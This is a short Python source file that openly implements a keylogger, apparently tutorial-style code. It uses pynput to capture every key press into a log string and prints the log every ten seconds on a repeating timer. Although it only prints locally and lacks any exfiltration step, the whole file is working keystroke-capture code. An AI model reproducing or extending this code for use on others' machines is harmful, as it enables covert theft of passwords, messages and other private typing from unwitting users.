#! usr/bin/env/python

import pynput.keyboard
import threading

log = ''

class keylogger:

    def __init__(self):
        self.log = ""

    def append_log(self,string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError :
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_log(current_key)

    def report(self):
        print(self.log)
        self.log = ""
        timer = threading.Timer(10, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

